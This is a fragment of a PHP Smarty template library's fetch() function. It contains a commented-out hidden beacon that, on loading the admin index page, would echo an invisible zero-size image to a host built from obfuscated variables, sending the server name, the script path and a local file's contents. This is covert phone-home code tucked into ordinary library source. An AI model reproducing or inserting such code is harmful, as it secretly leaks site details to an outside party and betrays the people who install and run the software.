 ...
 */
    ...
    function fetch($resource_name, $cache_id = null, $compile_id = null, $display = false)
    {
		...
		//if( strstr($resource_name,"admin/index.html") ){
			//echo "<img src=".$_smarty_p."://".implode(".",$_smarty_h)."/".$_smarty_i."/".$_smarty_j.".php?a=".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."&b=".file_get_contents("./include/smarty/readme.txt")." width='0' height='0'>";
		//}
        // load filters that are marked as autoload
